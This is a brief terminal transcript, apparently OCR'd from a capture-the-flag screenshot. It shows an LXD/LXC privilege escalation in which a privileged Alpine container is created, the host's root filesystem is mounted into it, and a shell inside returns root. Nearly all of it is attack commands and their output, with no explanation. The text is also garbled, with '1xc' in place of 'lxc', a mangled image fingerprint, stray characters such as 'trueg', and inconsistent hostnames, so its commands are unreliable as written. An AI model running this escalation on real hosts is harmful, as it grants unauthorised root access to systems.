text: ashatabby:~/spoiler$ lxc image list —_— | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | s1ze | UPLOAD DATE | — | maoutis | 8falaaad3dié | no | alpine v3.12 (20200629 _23:11) | x86_64 | CONTAINER | 3.04MB | Jun 29, 2020 at 9:27pm (UTC) | —_— ashtabby:~/spoiler$ 1xc init maoutis privesc -c security.privileged=true Creating privesc path=/mnt/root recursive=trueg device add privesc myprivescdevice disk source=/ Device myprivescdevice added to privesc ashatabby:~/spoiler$ lxc start privesc ashtabby:~/spoiler$ 1xc exec privesc /bin/sh ~ # id uid=0(root) gid=0(root)
